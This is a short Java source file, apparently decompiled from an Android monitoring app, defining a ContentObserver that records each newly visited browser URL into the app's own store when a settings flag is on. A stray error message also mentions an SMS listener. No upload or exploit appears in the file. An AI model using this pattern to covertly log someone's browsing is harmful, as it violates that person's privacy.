package iits.service;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.os.Handler;
import iits.code.bus.Setting_BUS;
import iits.code.bus.URL_BUS;
import iits.code.bus.URL_History_BUS;
import iits.code.dto.Setting_DTO;
import iits.code.dto.URL_DTO;
import iits.mamager.FileManager;

public class URLListener extends ContentObserver {
    private static final String TAG = "URLListener";
    private ContentResolver contentResolver;
    private Context context;
    private long time;

    public URLListener(Handler handler, ContentResolver contentResolver2, Context context2) {
        super(handler);
        try {
            this.contentResolver = contentResolver2;
            this.context = context2;
            this.time = 0;
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on SMSListener function: " + e.toString());
        }
    }

    public boolean deliverSelfNotifications() {
        return false;
    }

    public void onChange(boolean arg0) {
        URL_DTO url;
        super.onChange(arg0);
        try {
            Setting_DTO setting = Setting_BUS.get(this.context);
            if ((setting.getRunMode() || setting.getFlagURL()) && (url = URL_History_BUS.getAccessLastURL(this.contentResolver, this.time)) != null) {
                URL_BUS.insert(this.context, url);
                FileManager.WriteLog(1, TAG, "insert url: " + url.getURL());
                this.time = url.getTime();
            }
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on onChange function: " + e.toString());
        }
    }
}
